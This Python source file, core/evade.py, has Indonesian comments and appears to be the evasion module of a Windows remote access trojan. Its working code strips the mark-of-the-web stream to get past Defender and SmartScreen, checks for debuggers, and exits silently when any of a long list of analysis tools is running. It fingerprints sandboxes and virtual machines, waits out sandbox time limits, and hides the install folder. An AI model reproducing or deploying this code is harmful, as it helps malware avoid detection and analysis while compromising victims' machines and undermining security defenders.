"""core/evade.py — semua yang bikin dia nggak langsung kelihatan.

Isinya cuma yang beneran ngaruh di user-mode: mutex, sembunyiin console,
nolak lingkungan analisis, dan debugger check. Nggak ada patch AMSI/ETW
di sini karena nggak ada yang bisa di-patch: kode ini native/native-compiled,
nggak lewat .NET, PowerShell, atau VBScript, jadi AMSI nggak pernah nyentuh.

Kalau nanti lu bikin loader PowerShell/C# di atas ini, baru AMSI relevan.
"""

import ctypes
import os
import random
import sys
import time

import winreg

BIOS = r"HARDWARE\DESCRIPTION\System\BIOS"

VM_TAGS = ("vmware", "virtualbox", "vbox", "qemu", "xen", "bochs",
           "parallels", "innotek", "hyper-v", "virtual machine")

BAD_USERS = ("sandbox", "malware", "virus", "wdagutilityaccount", "safety", "virustotal")

# Proses analisis yang, kalau lagi jalan, bikin kita nggak bergerak.
TOOL_PROC = ("x64dbg", "x32dbg", "ollydbg", "idaq", "idaq64", "ida64", "idag",
             "windbg", "cdb", "procmon", "procmon64", "procexp", "procexp64",
             "wireshark", "fiddler", "httpdebugger", "dnspy", "ilspy",
             "cheatengine", "cheatengine-x86_64-sse4-avx2", "processhacker",
             "systeminformer", "apimonitor", "autoruns", "tcpview", "regmon",
             "pestudio", "die", "cffexplorer", "hollows_hunter")


def single_instance(tag):
    """Mutex bernama. Return handle atau None kalau sudah ada instance lain.

    Tanpa prefix Global\\ — namespace Global butuh SeCreateGlobalPrivilege
    yang nggak dimiliki proses user biasa.
    """
    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    h = k32.CreateMutexW(None, False, "Local\\" + tag)
    if ctypes.get_last_error() == 183:  # ERROR_ALREADY_EXISTS
        return None
    return h


def hide_console():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 0)


def strip_motw(path):
    """Hapus alternate data stream Zone.Identifier dari file.

    File yang datang lewat browser / Discord / email membawa stream ini.
    Selama ada, Defender dan SmartScreen memperlakukannya sebagai konten
    internet: cloud lookup, blokir heuristic, dan prompt reputasi. Stream
    ini cuma milik user, jadi menghapusnya nggak butuh hak apa pun.

    Return True kalau stream-nya memang ada dan sekarang hilang.
    """
    stream = path + ":Zone.Identifier"
    if not os.path.exists(stream):
        return False
    try:
        os.remove(stream)
        return True
    except OSError:
        return False


def debugger_present():
    try:
        k32 = ctypes.WinDLL("kernel32", use_last_error=True)
        if k32.IsDebuggerPresent():
            return True
        k32.GetCurrentProcess.restype = ctypes.c_void_p
        flag = ctypes.c_int(0)
        k32.CheckRemoteDebuggerPresent(k32.GetCurrentProcess(), ctypes.byref(flag))
        return bool(flag.value)
    except Exception:
        return False


def _running_tools():
    """Nama proses yang lagi jalan, dicocokkan ke TOOL_PROC.

    Cuma deteksi nama. Nggak perlu buka handle proses mana pun, jadi nggak
    ninggalin jejak di access log objek.
    """
    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    TH32CS_SNAPPROCESS = 0x00000002

    class PE32(ctypes.Structure):
        _fields_ = [("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
                    ("th32ProcessID", ctypes.c_ulong),
                    ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                    ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
                    ("th32ParentProcessID", ctypes.c_ulong),
                    ("pcPriClassBase", ctypes.c_long), ("dwFlags", ctypes.c_ulong),
                    ("szExeFile", ctypes.c_char * 260)]

    k32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
    snap = k32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if snap in (None, -1, ctypes.c_void_p(-1).value):
        return []
    found = []
    entry = PE32()
    entry.dwSize = ctypes.sizeof(entry)
    ok = k32.Process32First(snap, ctypes.byref(entry))
    while ok:
        name = entry.szExeFile.decode("latin-1", "replace").lower()
        stem = name[:-4] if name.endswith(".exe") else name
        if stem in TOOL_PROC:
            found.append(stem)
        ok = k32.Process32Next(snap, ctypes.byref(entry))
    k32.CloseHandle(ctypes.c_void_p(snap))
    return found


def _read_bios():
    out = []
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, BIOS)
    except OSError:
        return out
    for name in ("SystemManufacturer", "SystemProductName", "BIOSVendor",
                 "BaseBoardManufacturer"):
        try:
            out.append(str(winreg.QueryValueEx(key, name)[0]).lower())
        except OSError:
            pass
    winreg.CloseKey(key)
    return out


def _uptime_minutes():
    return ctypes.windll.kernel32.GetTickCount64() // 60000


def _ram_gb():
    class M(ctypes.Structure):
        _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
                    ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                    ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                    ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                    ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
    m = M()
    m.dwLength = ctypes.sizeof(m)
    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m))
    return m.ullTotalPhys / 2 ** 30


def _disk_free_gb():
    """Ruang bebas di drive tempat payload tinggal, bukan selalu C:.

    Versi pertama memaku ke %SystemDrive%. Di mesin yang sistemnya sesak
    tapi data di drive lain, angka itu nggak ada hubungannya dengan ruang
    yang benar-benar dipakai payload.
    """
    try:
        import shutil
        base = os.getenv("LOCALAPPDATA") or (os.getenv("SystemDrive") or "C:") + "\\"
        drive = os.path.splitdrive(base)[0] + "\\"
        return shutil.disk_usage(drive).free / 2 ** 30
    except OSError:
        return 999


def sandbox_reasons():
    """Balikin list alasan kalau lingkungannya kelihatan palsu.

    Sinyal lemah cuma dihitung kalau ada sinyal kuat yang sudah nyala.
    Contohnya disk: mesin kerja beneran sering cuma sisa beberapa ratus MB,
    dan kalau itu dihitung sendirian, RAT menolak jalan di mesin normal —
    persis yang kejadian di mesin ini (C: sisa 0,5 GB).
    """
    reasons = []
    user = (os.getenv("USERNAME") or "").lower()
    if user in BAD_USERS:
        reasons.append("user=%s" % user)
    if _uptime_minutes() < 8:
        reasons.append("uptime=%dm" % _uptime_minutes())
    if _ram_gb() < 2.0:
        reasons.append("ram=%.1fGB" % _ram_gb())
    for tag in VM_TAGS:
        for value in _read_bios():
            if tag in value:
                reasons.append("bios=%s" % value)
                break

    # Lemah: cuma penambah keyakinan, bukan penentu sendiri.
    if _disk_free_gb() < 15.0 and (reasons or _ram_gb() < 4.0):
        reasons.append("disk=%.0fGB" % _disk_free_gb())
    return reasons


def guard(anti_vm):
    """True = lanjut. False = keluar diam-diam.

    Debugger / tool analisis  -> langsung keluar, tanpa suara.
    Sandbox (VM, uptime pendek) -> jangan keluar; TUNGGU. Sandbox punya
    batas waktu 5-10 menit, dan autostart setelah logon itu uptime < 8
    menit — kalau langsung exit, persistensi sendiri yang jadi korban.
    Menunggu menyelesaikan dua-duanya: sandbox habis waktu, mesin asli
    cuma telat empat menit.
    """
    if not anti_vm:
        return True
    if debugger_present() or _running_tools():
        return False
    for attempt in range(13):
        if not sandbox_reasons():
            return True
        if attempt < 12:
            time.sleep(60 + random.random() * 45)
    return False


def phish_visibility():
    """Sembunyiin folder install dari Explorer cepat.

    Attribut +H +S. Nggak nyembunyiin dari `dir /a` atau Explorer dengan
    'show hidden' aktif. Pengalih perhatian, bukan penghilang.
    """
    try:
        import subprocess
        from . import persist
        parent = os.path.dirname(persist.install_dir("").rstrip("\\"))
        subprocess.run(["attrib", "+h", "+s", parent],
                       capture_output=True, creationflags=0x08000000)
        return True
    except Exception:
        return False
